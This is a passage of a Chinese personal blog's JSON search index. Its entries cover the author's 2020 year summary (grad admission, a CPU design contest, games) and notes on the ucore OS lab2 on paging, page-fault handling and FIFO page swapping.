e2d\u79d1\u5927\uff0c\u8ba1\u7b97\u6240\uff0c\u534e\u4e2d\u79d1\u5927-\u56fd\u5149\uff0c\u4e0a\u6d77\u79d1\u6280\u5927\u5b66\uff0c\u56fd\u9632\u79d1\u5927\uff0c\u90fd\u662f\u504f\u7cfb\u7edf\u65b9\u5411\u7684\u3002\u5728\u5b9e\u9a8c\u5ba4\u51c6\u5907\u6750\u6599\u3001\u51c6\u5907\u9762\u8bd5\u7684\u65f6\u95f4\u5370\u8c61\u8fd8\u662f\u633a\u6df1\u523b\u7684\u3002\u6700\u7ec8\u88ab\u4e2d\u79d1\u5927\u5b89\u8679\u8001\u5e08\u7ec4\u5f55\u53d6\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u9f99\u82af\u676f2020","title":"\u9f99\u82af\u676f2020","text":"<p>\u9f99\u82af\u676f\uff0c\u521d\u8d5b\u4ece7.15\u65e5\u5f00\u59cb\u52308.5\u65e5\u5f04\u4e86\u4e0d\u52303\u4e2a\u661f\u671f\u3002</p> <p>\u8bb0\u5f97\u540e\u9762\u4e00\u4e2a\u661f\u671f\uff0c\u521a\u5f00\u59cb\u7684\u6027\u80fd\u4e0a\u677f\u4e0d\u901a\uff0c\u9891\u7387\u4e5f\u53ea\u670950M\u5de6\u53f3\uff0c\u5341\u5206\u90c1\u95f7\u3002\u540e\u9762cache burst\u8c03\u901a\u4e86\uff0c\u9891\u7387\u4e5f\u795e\u5947\u5730\u63d0\u5347\u523090M\u3002\u518d\u5230\u540e\u6765\uff0c\u8c03\u6e05\u534e\u76d1\u63a7\u7a0b\u5e8f\u8fde\u7eed\u8c03\u4e863\u5929\uff0c\u5dee\u70b9\u653e\u5f03\u3002\u603b\u4e4b\uff0c\u90a3\u6bb5\u65f6\u95f4\u5fc3\u60c5\u5c31\u8ddf\u5750\u8fc7\u5c71\u8f66\u4e00\u6837\uff0c\u5341\u5206\u523a\u6fc0\u3002</p> <p>\u51b3\u8d5b\u4ece8.8\u52308.20\uff0c\u4e3b\u8981\u6dfb\u52a0\u5b8c\u5584\u4e86TLB\uff0c\u6dfb\u52a0\u4e86100\u6761\u6307\u4ee4\uff0c\u4ee5\u53ca\u8c03\u901aPMON\u3002</p> <p>\u51b3\u8d5b\u540c\u6837\u5341\u5206\u523a\u6fc0\uff0c\u4e2d\u95f4\u4e5f\u5dee\u70b9\u653e\u5f03\uff0c\u76f4\u5230\u6700\u540e\u4e00\u5929\u8c03\u901a\u4e86PMON\uff0c\u5e76\u901a\u5bb5\u5199\u6587\u6863\u3002\u4e4b\u540e\u4fbf\u662f\u51c6\u5907\u7b54\u8fa9\uff0c\u672c\u6765\u8ba1\u5212\u6211\u6765\u8bb2\u7684\uff0c\u4f46\u662f\u6700\u540e\u4e00\u5929\u5403\u5348\u996d\u65f6\u8fd8\u662f\u51b3\u5b9a\u8ba9lg\u6765\u8bb2\u4e86\uff08\u4ed6\u786e\u5b9e\u8981\u6d41\u7545\u4e9b\uff09\u3002\u4e0d\u8fc7\u5728\u56de\u7b54\u8bc4\u59d4\u6211\u4eec\u5bf9\u4e8e\u8dd1linux\u6dfb\u52a0\u5916\u8bbe\u7684\u8ba1\u5212\u65f6\uff0c\u6211\u4eec\u6ca1\u6709\u7b54\u4e0a\u6765\uff0c\u6709\u4e9b\u9057\u61be\u3002\u6700\u540e\u83b7\u5f97\u4e862\u7b49\u5956\u7684\u6210\u7ee9\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#\u5927\u56db","title":"\u5927\u56db","text":"","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#dnf","title":"DNF","text":"<p>\u60f3\u56de\u5fc6\u4e00\u4e0b\u4ee5\u524d\u73a9\u7684DNF\u624b\u673a\u7248\uff08\u5973\u67aa\uff09\uff0c\u53d1\u73b0\u88c5\u5b89\u5353\u865a\u62df\u673a4.4\u4e5f\u6ca1\u529e\u6cd5\u89e3\u51b3\u521a\u5f00\u59cb\u7b2c\u4e00\u4e2a\u4efb\u52a1\u7684bug\u3002\u770b\u6765\u53ea\u80fd\u5728\u8001\u624b\u673a\u624d\u80fd\u8fd0\u884c\u4ee5\u524d\u7684\u8001\u5e94\u7528\u4e86\u3002</p> <p>\u540e\u6765\u5c1d\u8bd5\u4e86\u4e00\u4e0bPC\u7684dnf\uff0c\u5c1d\u8bd5\u4e86\u5973\u6f2b\u6e38\uff0c\u5973\u67aa\u70ae\uff0c\u67aa\u5251\u58eb\u3002\u4f46\u662f\u82e6\u4e8ePC\u7248\u7684DNF\u7684\u4f53\u529b\u8bbe\u7f6e\uff0c\u4e00\u5929\u5e76\u4e0d\u80fd\u73a9\u5f88\u4e45\u3002\u4e8e\u662f\u4fbf\u7814\u7a76\u81ea\u5df1\u642d\u8bbeDNF\u670d\u52a1\u5668\uff0c\u6700\u540e\u5728\u865a\u62df\u673a\u4e0a\u642d\u5efa\u4e86DNF\u670d\u52a1\u5668\uff0c\u5e76\u80fd\u591f\u8054\u673a\u3002\u4e0d\u8fc7\u7248\u672c\u6bd4\u8f83\u8001\uff0c\u4f1a\u51fa\u73b0\u7b49\u7ea7\u4e0d\u591f\u6ca1\u6709\u4efb\u52a1\u7684\u60c5\u51b5\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#cemu\u585e\u5c14\u8fbe\u4f20\u8bf4\u8352\u91ce\u4e4b\u606f","title":"Cemu+\u585e\u5c14\u8fbe\u4f20\u8bf4\u8352\u91ce\u4e4b\u606f","text":"<p>\u539f\u795ePC\u516c\u6d4b\u65f6\uff0c\u51fa\u4e8e\u5174\u8da3\u4e0b\u8f7d\u6e38\u73a9\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u81ea\u5df1\u7684\u7535\u8111\u5e26\u4e0d\u52a81080p\u7684\u753b\u8d28\uff0c\u800c\u5ba4\u53cb\u7684\u53f0\u5f0f\u673a\u5219\u6beb\u65e0\u538b\u529b\u3002\u7a81\u7136\u60f3\u5230\u8fd9\u79cd\u914d\u7f6e\u662f\u5426\u53ef\u4ee5\u5e26\u5f97\u52a8cemu\u6a21\u62df\u5668\u7248\u7684\u8d5b\u5c14\u8fbe\u8352\u91ce\u4e4b\u606f\u3002\u7ecf\u8fc7\u5b9e\u8df5\u540e\u53d1\u73b0\u786e\u5b9e\u53ef\u4ee5\u4fdd\u63011080p 30\u5e27\u3002\u800c\u4e14\u6211\u4e5f\u53d1\u73b0cemu\u4ecev1.18\u7248\u672c\u5f15\u5165\u4e86\u5f02\u6b65\u7f16\u8bd1\u7684\u529f\u80fd\uff0c\u5927\u5e45\u63d0\u9ad8\u4e86vulkan\u7684\u6027\u80fd\u3002\u5728\u5c1d\u8bd5\u540e\uff0c\u6211\u53d1\u73b0\u6211\u7684\u7b14\u7535\u4e5f\u53ef\u4ee5\u57281600*900\u7684\u5206\u8fa8\u7387\u4ee5\u63a5\u8fd130\u5e27\u6e38\u73a9\uff0c\u603b\u4e4b\u5df2\u7ecf\u8d85\u8fc7\u4e86\u53ef\u73a9\u7684\u7a0b\u5ea6\u3002\u7136\u540e\u53c8\u5e2e\u5ba4\u53cb\u7684\u7b14\u7535\u88c5\u4e86\u4e00\u4e0b\uff0c\u4e5f\u53ef\u4ee5\u57fa\u672c\u57fa\u672c\u4fdd\u63011080p 30\u5e27\u3002\u4e8e\u662f\u5ba4\u53cb\u5728\u6211\u7684\u5168\u529b\u63a8\u8350\u4e0b\uff0c\u4e00\u8d77\u5f00\u59cb\u4e86\u6109\u5feb\u7684\u6d77\u62c9\u9c81\u6d41\u6c13\u4e4b\u65c5\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/09/07/2020-09-07-%E5%85%B3%E4%BA%8E2020%E5%88%B0%E7%9B%AE%E5%89%8D%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%BB%E7%BB%93/#ucore\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u9a8c","title":"Ucore\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u9a8c","text":"<p>\u6211\u5927\u56db\u7684\u5b9e\u4e60\u662f\u5e2e\u52a9\u8ba1\u7ec4\u8001\u5e08\u4ece\u4e8b\u6559\u6539\u65b9\u9762\u7684\u5de5\u4f5c\u3002\u8ba1\u5212\u80fd\u591f\u5728\u81ea\u5df1\u5199\u7684cpu\u4e0a\u8fd0\u884cucore\u7684mips\u7248\u672c\u3002\u8fd8\u6709\u5176\u5b83\u7684\u5de5\u4f5c\u662f\u5e2e\u5fd9\u5199\u8ba1\u7ec4\u786c\u7efc\u6307\u5bfc\u4e66\uff0c\u4ee5\u53ca\u8bbe\u8ba1lg\u90a3\u8fb9\u7684\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u5b9e\u9a8c\uff08cache\u5b9e\u9a8c\uff09\u3002</p> <p>\u5728\u9f99\u82af\u676f\u62ff\u5956\u7684\u540c\u65f6\uff0c\u6211\u4e5f\u6df1\u523b\u610f\u8bc6\u5230\u6211\u4eec\u64cd\u4f5c\u7cfb\u7edf\u65b9\u9762\u77e5\u8bc6\u7684\u6b20\u7f3a\u3002\u56e0\u6b64\u4fbf\u5c1d\u8bd5\u505a\u4e00\u4e0bscl\u8bbe\u8ba1\u7684\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u9a8c\uff0c\u987a\u4fbf\u5e2e\u5fd9\u8fdb\u884c\u8bc4\u4f30\u3002\u56db\u4e2a\u5b9e\u9a8c\u6211\u95f4\u65ad\u5730\u505a\u4e864\u4e2a\u661f\u671f\uff0c\u5927\u7ea6\u4e00\u4e2a\u5b9e\u9a8c\u4e00\u4e2a\u661f\u671f\u3002\u6709\u70b9\u6162\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u671f\u95f4\u65e9\u4e0a9\u70b9\u591a\u8d77\uff0c\u901a\u5e38\u53ea\u6709\u4e0b\u5348\u4f1a\u5de5\u4f5c\u3002\u5e76\u4e14\u4e14\u671f\u95f4\u4e5f\u6ca1\u6709\u5b8c\u5168\u6295\u5165\u5730\u505a\u8fd9\u4ef6\u4e8b\u3002</p> <p>\u505a\u5b9e\u9a8c\u671f\u95f4\u6709\u5199\u4e00\u4e9b\u8bb0\u5f55\uff0c\u6ca1\u6709\u5b9e\u9a8c4\u662f\u56e0\u4e3a\u6587\u4ef6\u7cfb\u7edf\u5bf9\u8dd1mips\u7248\u672c\u7684ucore\u5f71\u54cd\u4e0d\u5927\uff0c\u4e14\u4ee5\u6211\u7684\u6027\u683c\u8981\u5b8c\u5168\u641e\u61c2\u5185\u5bb9\u6709\u70b9\u591a\uff0c\u56e0\u6b64\u51b3\u5b9a\u4ee5\u540e\u6709\u673a\u4f1a\u518d\u770b\uff0c\u5148\u628a\u5f53\u524d\u8981\u7d27\u7684\u6307\u5bfc\u4e66\u5b8c\u6210\u3002</p>","tags":["\u5e74\u5ea6\u603b\u7ed3"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/","title":"ucore lab2\u603b\u7ed3","text":"","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u56de\u987e\u5b9e\u9a8c1\uff0c\u6211\u89c9\u5f97\u9700\u8981\u5b66\u4e60\u7684\u77e5\u8bc6\u6709\uff1a</p> <ol> <li>gdb\u5de5\u5177\u7684\u4f7f\u7528</li> <li>ELF\u6587\u4ef6\u7684\u683c\u5f0f\uff0c\u4ee5\u53careadelf, objdump, objcopy\u5de5\u5177\u7684\u4f7f\u7528\uff08\u67e5\u770b\u5404\u4e2asection\uff0c\u67e5\u770b\u7b26\u53f7\u8868\uff09</li> <li>x86\u6c47\u7f16\u57fa\u7840\uff08\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u6bb5\u5bc4\u5b58\u5668\uff0cEIP\uff0cEFLAG\u7b49\uff09\uff0cGCC\u5185\u8054\u6c47\u7f16\u683c\u5f0f\uff08AT&amp;T\u683c\u5f0f\uff09</li> <li>x86\u5185\u5b58\u5206\u6bb5\u673a\u5236\uff08GDT\u8868\uff0c\u6bb5\u63cf\u8ff0\u7b26\uff09</li> <li>x86\u4e2d\u65ad\u5904\u7406\u673a\u5236\uff08IDT\u8868\uff0c\u4e2d\u65ad\u5411\u91cf -&gt; \u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\uff09</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u542f\u52a8\u8fc7\u7a0b\uff08BIOS-&gt;bootloader(\u7b2c\u4e00\u6247\u533a)-&gt;Kernel\u5404\u9636\u6bb5\u505a\u7684\u4e8b\u60c5\uff09</li> </ol> <p>\u800c\u505a\u5b8c\u5b9e\u9a8c2\u540e\uff0c\u6211\u89c9\u5f97\u9700\u8981\u5b66\u4e60\u7684\u77e5\u8bc6\u6709\uff1a</p> <ol> <li>BIOS\u63a2\u6d4b\u7269\u7406\u5185\u5b58\uff0cKernel\u6253\u5f00\u5206\u9875\u65f6\u81ea\u5e26\u4e00\u4e2a\u9875\u8868</li> <li>\u4e8c\u7ea7\u9875\u8868\u8fdb\u884c\u865a\u62df\u5730\u5740\u8f6c\u6362</li> <li>\u7269\u7406\u5185\u5b58\u7ba1\u7406 \u4e4b \u7a7a\u95f2\u5757(\u4ee5\u9875\u4e3a\u5355\u4f4d)\u7ba1\u7406\uff08Page\u6570\u636e\u7ed3\u6784\u548c\u7269\u7406\u9875\u7684\u5bf9\u5e94\uff0c\u7a7a\u95f2\u5757\u94fe\u8868free_list\uff0cFirstHit\u5206\u914d\u8fde\u7eed\u7684\u7269\u7406\u9875\uff09</li> <li>\u865a\u62df\u5185\u5b58\u7ba1\u7406 \u4e4b \u6709\u6548\u865a\u62df\u9875\uff08\u8868\u793a\u4e00\u4e2a\u7a0b\u5e8f\u53ef\u80fd\u4f7f\u7528\u7684\u865a\u62df\u5730\u5740\u6bb5\uff0cvma, mm\u6570\u636e\u7ed3\u6784\uff09</li> <li>\u5bfc\u81f4PageFault\u7684\u539f\u56e0\uff081. pte=0\u5373\u4ece\u6765\u6ca1\u6709\u88ab\u52a0\u8f7d\u8fc7, 2. \u88abswap out, 3. \u8bbf\u95ee\u6743\u9650\u9519\u8bef\uff09</li> <li>FIFO\u9875\u66ff\u6362\u7b97\u6cd5\u5b9e\u73b0\uff08page struct\u589e\u52a0pra_page_link, pra_vaddr\uff0cmm-&gt;sm_priv(pra_list_header)\u8bb0\u5f55\u6700\u8fd1\u4f7f\u7528\u7684\u9875\u5e8f\u5217\uff1bswap_manager\uff09</li> </ol> <p>\u4ee5\u4e0b\u4ecb\u7ecd\u4e00\u4e9b\u96be\u70b9</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#\u6d41\u7a0b","title":"\u6d41\u7a0b","text":"","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#\u542f\u52a8\u65f6\u7684\u9875\u8868","title":"\u542f\u52a8\u65f6\u7684\u9875\u8868","text":"<p>\u7531\u4e8ebootloader\u52a0\u8f7d\u5185\u6838\u65f6\uff0c\u5c06\u5730\u5740\u4e0e\u4e0a\u4e86\u4e00\u4e2a0xfff_ffff\uff0c\u5373\u62b9\u53bb\u4e86\u6700\u9ad8\u4f4d\u3002\u800c\u5185\u6838\u7684\u865a\u5730\u5740\u4e3a0xc010_0000 ~ 0xc012_4118\u3002\u56e0\u6b64\u7ebf\u6027\u5730\u5740\u4e0e\u7269\u7406\u5730\u5740\u7684\u6620\u5c04\u5173\u7cfb\u4e3a\uff1a</p> <pre><code>\u7ebf\u6027\u5730\u5740 = \u7269\u7406\u5730\u5740 + 0xc000_0000\n</code></pre> <p>\u5185\u6838\u81ea\u5e26\u4e00\u4e2a\u9875\u76ee\u5f55\u8868(4KB)\u548c\u4e00\u4e2a\u9875\u8868(4KB)\u7528\u4e8e\u5b8c\u6210\u8be5\u6620\u5c04\uff08\u6620\u5c04\u4e864M\u7684\u7a7a\u95f4\uff09</p> <p>x86\u6253\u5f00\u5206\u9875\u673a\u5236\uff0c\u53ea\u9700\u63d0\u524d\u5c06\u9875\u76ee\u5f55\u8868\u7684\u8d77\u59cb\u5730\u5740\u52a0\u8f7d\u5230cr3\u5bc4\u5b58\u5668\uff0c\u7136\u540e\u7f6e\u4e0acr3\u7684\u67d0\u4e00\u4f4d\u5373\u53ef \u4e4b\u540e\uff0ccpu\u6bcf\u6b21\u53d1\u51fa\u7684\u5730\u5740\u90fd\u4f1a\u88ab\u786c\u4ef6\u8f6c\u6362\u4e3a\u7269\u7406\u5730\u5740</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#\u81ea\u6620\u5c04","title":"\u81ea\u6620\u5c04","text":"<p>\u4e3b\u8981\u4f5c\u7528\u662f\u901a\u8fc7\u8bbf\u95ee\u5730\u5740<code>VPT+offset</code>\uff0c\u4fbf\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u4efb\u610f\u4e00\u4e2a\u9875\u8868\u9879\uff084G\u865a\u62df\u5730\u5740\u7a7a\u95f4\u6700\u591a\u67091M\u4e2a\u9875\u8868\u9879\uff09\uff0c\u800c\u4e0d\u7528\u5148\u8bbf\u95ee\u4e00\u6b21\u9875\u76ee\u5f55\u9879\uff0c\u8f6c\u6362\u6210\u865a\u62df\u5730\u5740\u540e\u518d\u8bbf\u95ee\u9875\u8868\u9879\u3002</p> <p>VPT\u662f\u4e00\u4e2a4M\u5bf9\u9f50\u7684\u5730\u5740\uff08\u4f4e22\u4f4d\u4e3a0\uff09</p> <pre><code>boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W\npte_t * const vpt = (pte_t *) VPT\npde_t * const vpd = (pde_t *) PGADDR((PDX(VPT), PDX(VPT), 0)\n</code></pre> <p>\u7ecf\u8fc7\u4e0a\u9762\u7684\u6b65\u9aa4\u540e\u8003\u8651\u8bbf\u95ee\u865a\u62df\u5730\u5740vpt\u548cvpd\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f \u8bbf\u95eevpt\u65f6\uff0c\u7ecf\u8fc7\u9875\u76ee\u5f55\u8868\u7684\u6620\u5c04\uff0c\u6620\u5c04\u5230boot_pgdir\u81ea\u8eab\uff0c\u518d\u7ecf\u8fc7\u4e00\u5c42\u6620\u5c04\uff08boot_pgdir\u4f5c\u4e3a\u9875\u8868\uff09\uff0c\u8bbf\u95ee\u4e86boot_pgdir[0]\u5bf9\u5e94\u7684\u9875\u8868\u7684\u7b2c\u4e00\u4e2a\u9875\u8868\u9879\u3002 \u4f9d\u6b21\u8bbf\u95eevpt\u540e\u76844M\u5730\u5740\u7a7a\u95f4\uff0c\u4fbf\u53ef\u4ee5\u8bbf\u95ee\u6574\u4e2a1M\u4e2a\u9875\u8868\u9879pte \u8bbf\u95eevpd\u65f6\uff0cvpd\u5219\u88ab\u6620\u5c04\u5230boot_pgdir\u81ea\u8eab\u6240\u5728\u9875\u7684\u8d77\u59cb\u5730\u5740\uff0c\u56e0\u6b64\u8bbf\u95eevpd\u540e\u76844KB\u7a7a\u95f4\uff0c\u53ef\u8bbf\u95ee\u6240\u6709\u7684\u9875\u76ee\u5f55\u9879\u3002</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#print_pgdir\u8f93\u51fa","title":"print_pgdir\u8f93\u51fa","text":"<p>-------------------- BEGIN -------------------- PDE(0e0) c0000000-f8000000 38000000 urw   |-- PTE(38000) c0000000-f8000000 38000000 -rw PDE(001) fac00000-fb000000 00400000 -rw   |-- PTE(000e0) faf00000-fafe0000 000e0000 urw   |-- PTE(00001) fafeb000-fafec000 00001000 -rw --------------------- END ---------------------</p> <p>print_pgdir\u7684\u4f5c\u7528\u662f\u8f93\u51fa\u9875\u76ee\u5f55\u8868\u548c\u9875\u8868\u7684\u6574\u4f53\u60c5\u51b5\uff0c\u6309\u7167\u88ab\u8fde\u7eed\u6620\u5c04\u7684\u865a\u62df\u5730\u5740\u5757\u7684\u5f62\u5f0f\u8f93\u51fa\u3002</p> <p>print_pgdir\u5148\u901a\u8fc7vpd\u8bbf\u95eeboot_pgdir\uff0c\u627e\u5230\u4e00\u4e2a\u88ab\u8fde\u7eed\u6620\u5c04\u7684\u865a\u62df\u5730\u5740\u5757\uff08\u4ee54M\u4e3a\u5355\u4f4d\uff09\uff0c\u63a5\u7740\u8fdb\u4e00\u6b65\u901a\u8fc7vpt\u8bbf\u95ee\u9875\u8868\u9879\u627e\u5230\u66f4\u7cbe\u786e\u7684\u8fde\u7eed\u865a\u62df\u5730\u5740\u5757\uff08\u4ee54KB\u4e3a\u5355\u4f4d\uff09\u3002\uff08\u4e0a\u9762\u5df2\u7ecf\u8bf4\u660e\u53ef\u4ee5\u901a\u8fc7vpt\u8bbf\u95ee\u6574\u4e2a1M\u9879pte\uff09</p> <p></p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#pagefault\u5904\u7406","title":"PageFault\u5904\u7406","text":"<pre><code>pagefault\u53d1\u751f -&gt; (vector14-&gt;__all_traps-&gt;trap)-&gt;trap_dispatch-&gt;pgfault_handler-&gt;do_pgfault\n</code></pre> <p>\u6700\u5173\u952e\u7684\u4e3ado_pgfault\u51fd\u6570\uff0c\u4f4d\u4e8evmm.c\u4e2d</p> <p>\u4e3b\u8981\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>\u8c03\u7528find_vma\uff0c\u68c0\u67e5\u5f15\u8d77\u5f02\u5e38\u7684\u662f\u5426\u4e3a\u6709\u6548\u7684\u865a\u62df\u5730\u5740</li> <li>\u68c0\u67e5\u6743\u9650\uff08\u6ca1\u592a\u770b\u61c2\u4f5c\u7528\uff09</li> <li>\u8c03\u7528get_pte\uff0c\u5982\u679cpte\u5168\u4e3a0\uff0c\u8868\u793a\u7b2c\u4e00\u6b21\u8bbf\u95ee\uff0c\u8c03\u7528pgdir_alloc_page\u968f\u673a\u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875</li> <li>\u5982\u679cpte\u4e3a\u4e00\u4e2aswap\u9879\uff08\u4e4b\u524d\u88ab\u6362\u51fa\u8fc7\uff09\uff0c\u5219\u8c03\u7528swap_in\u51fd\u6570\uff08\u8c03\u7528alloc_page\u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875\uff0c\u518d\u8c03\u7528swapfs_read\u51fd\u6570\u5c06\u9875\u4ece\u78c1\u76d8\u6362\u5165\u5230\u5185\u5b58\uff08\u8be5\u7269\u7406\u9875\uff09\uff09\u3002\u6700\u540e\u66f4\u65b0\u9875\u8868\u9879\uff0c\u8ba9\u5176\u6307\u5411\u8be5\u7269\u7406\u9875\u3002\u7136\u540e\u8c03\u7528swap_map_swappable\u5c06\u8be5\u7269\u7406\u9875\u6dfb\u52a0\u5230FIFO\u4e2d\uff08swap manager\u7ef4\u62a4\u7684\u94fe\u8868\uff09</li> </ol> <p>\u6ce8\uff1a</p> <ol> <li>\u5176\u4e2d\u7684pgdir_alloc_page\u51fd\u6570\u53ea\u5728\u8fd9\u91cc\u4f7f\u7528\u5230\u4e86\u3002\u4f5c\u7528\u662f\u8c03\u7528alloc_page\u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875\uff0c\u5e76\u5c06\u5176\u6dfb\u52a0\u5230FIFO\u4e2d</li> <li>alloc_page\u51fd\u6570\u5728\u7a7a\u95f2\u5757\u4e0d\u591f\u65f6\uff0c\u4fbf\u4f1a\u8c03\u7528swap_out\u51fd\u6570\u3002swap_out\u8fc7\u7a0b\u5982\u4e0b\uff1a</li> <li>\u8c03\u7528swap_out_victim\u51fd\u6570\u627e\u5230\u88ab\u66ff\u6362\u7684\u9875page\uff08FIFO\u7ed3\u5c3e\uff09</li> <li>\u8c03\u7528swapfs_write\u51fd\u6570\u5c06\u8be5\u7269\u7406\u9875\u4ece\u5185\u5b58\u5199\u5230\u78c1\u76d8\uff08\u6247\u533a\u53f7\u5bf9\u5e94page-&gt;pra_vaddr\uff09</li> <li>\u901a\u8fc7page-&gt;pra_vaddr\u67e5\u627e\u9875\u8868\uff0c\u5e76\u66f4\u65b0\u5bf9\u5e94pte\u4e3aswap\u9879\uff08\u8fd9\u91cc\u5982\u679c\u9047\u5230\u591a\u4e2a\u865a\u62df\u5730\u5740\u5bf9\u5e94\u4e00\u4e2a\u7269\u7406\u5730\u5740\u7684\u60c5\u51b5\u600e\u4e48\u529e\u5462\uff1f\uff09</li> </ol> <p>\u5b58\u5728\u8c03\u7528\u94fekern_init()-&gt;vmm_init()-&gt;check_pgfault()</p> <p>\u5176\u4e2dcheck_pgfault\u51fd\u6570\u5728\u8bbf\u95ee\u5730\u57400x100\u65f6\u4f1a\u89e6\u53d1pte\u51680\u7684pagefault\uff0c\u5206\u914d\u7269\u7406\u9875\u540e\u4fbf\u4e0d\u4f1a\u518d\u4ea7\u751f\u4e86\u3002</p> <p>\uff08\u540e\u9762\u5206\u6790check_swap\u4f1a\u4ea7\u751f\u89e6\u53d1swap\u7684page fault\uff09</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#fifo\u9875\u66ff\u6362\u8fc7\u7a0bcheck_swap\u8fc7\u7a0b","title":"FIFO\u9875\u66ff\u6362\u8fc7\u7a0b(check_swap\u8fc7\u7a0b)","text":"<p>\u5b58\u5728\u8c03\u7528\u94fekern_init()-&gt;swap_init()-&gt;check_swap()</p> <p>\u4e0b\u9762\u5206\u6790check_swap\u7684\u6574\u4e2a\u8fc7\u7a0b</p> <ol> <li>\u8bbe\u7f6e\u73af\u5883\uff0c\u6700\u7ec8\uff1a1. \u7a7a\u95f2\u5757\u94fe\u8868\u5305\u542b4\u4e2a\u7269\u7406\u9875\u30022. \u8bbe\u7f6evma\uff0c0x1000~0x5000\u90fd\u662f\u6709\u6548\u7684\u865a\u62df\u5730\u5740</li> <li>\u8c03\u7528check_content_set()\uff0c\u4f9d\u6b21\u5199\u4e860x1000, 0x2000, ..., 0x4000\u56db\u4e2a\u5730\u5740\uff08\u5206\u522b\u7528a, b, c, d\u8868\u793a\uff09\uff0c\u89e6\u53d1\u56db\u6b21\u521d\u59cbpage fault\u3002\u6b64\u65f6\u5df2\u7ecf\u6ca1\u6709\u7a7a\u95f2\u9875\u4e86</li> <li>\u8c03\u7528check_content_access\uff0c\u4f9d\u6b21\u8bbf\u95eec, a, d, b, e, b, a, b, c, d, e</li> <li>\u8bbf\u95eec, a, d, b</li> <li>\u8bbf\u95eee\u65f6pgfault\uff0cpte\u51680\uff0c\u8c03\u7528alloc_page\u5bfc\u81f4swap out\u51faa\u5bf9\u5e94\u7684\u7269\u7406\u9875\uff0c\u6807\u8bb0a\u7684\u9875\u8868\u9879\u4e3aswap\u9879</li> <li>\u8bbf\u95eeb</li> <li>\u8bbf\u95eea\u65f6pgfault\uff0cpte\u4e3aswap\u9879\uff0c\u8c03\u7528swap in\uff0cswap in\u8c03\u7528alloc_page\u53c8\u5bfc\u81f4swap out\u51fab\u5bf9\u5e94\u7684\u7269\u7406\u9875\uff0c\u6807\u8bb0b\u7684\u9875\u8868\u9879\u4e3aswap\u9879\uff0c\u66f4\u65b0a\u7684\u9875\u8868\u9879\u4e3a\u5bf9\u5e94\u7269\u7406\u9875\u3002</li> <li>\u8bbf\u95eeb\u65f6pgfault...</li> <li>...</li> </ol> <p>\u8f93\u51fa\u5982\u4e0b\uff1a</p> <pre><code>check_vma_struct() succeeded!\npage fault at 0x00000100: K/W [no page found].\ncheck_pgfault() succeeded!\ncheck_vmm() succeeded.\nide 0:      10000(sectors), 'QEMU HARDDISK'.\nide 1:     262144(sectors), 'QEMU HARDDISK'.\nSWAP: manager = fifo swap manager\nBEGIN check_swap: count 1, total 31964\nsetup Page Table for vaddr 0X1000, so alloc a page\nsetup Page Table vaddr 0~4MB OVER!\nset up init env for check_swap begin!\npage fault at 0x00001000: K/W [no page found].\npage fault at 0x00002000: K/W [no page found].\npage fault at 0x00003000: K/W [no page found].\npage fault at 0x00004000: K/W [no page found].\nset up init env for check_swap over!\nwrite Virt Page c in fifo_check_swap\nwrite Virt Page a in 